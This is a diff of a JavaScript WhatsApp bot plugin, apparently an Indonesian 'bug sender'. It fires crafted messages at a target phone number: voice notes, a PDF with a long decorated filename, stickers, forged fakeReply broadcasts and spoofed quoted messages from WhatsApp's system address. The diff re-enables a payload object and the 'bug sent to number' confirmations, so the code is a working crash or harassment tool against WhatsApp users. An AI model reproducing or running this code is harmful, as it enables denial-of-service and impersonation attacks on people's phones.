@@ -121,8 +121,8 @@ sellerJid: '0@s.whatsapp.net'}},
 contextInfo: {"forwardingScore":999,"isForwarded":true},
 sendEphemeral: true}	
 //=================================================//	
-// doc
-/*const doc = { 
+//doc
+const doc = { 
 key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
@@ -258,18 +258,18 @@ switch (type) {
 
 case 'vn': {
  conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
-//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
+await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
 }
 break
 case 'pdf': {
  conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
-//await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
+await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
 }
 break
 case 'sticker': {
 let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
 conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
-//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
+await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 }
 break
 case 'bugimg': {
@@ -283,7 +283,7 @@ conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '1551786807
 conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
 conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
 conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
-//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
+await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 
 }
 break
@@ -299,12 +299,12 @@ let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.w
 }
 }, {quoted: fkontaak, contextInfo:{}}) 
 conn.relayWAMessage(res)
-//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
+await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 }
 break
 case 'reactpc': {
 await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${wm}` }, {quoted: trol})
-//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
+await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
 }
 break
 case 'bugtag': {
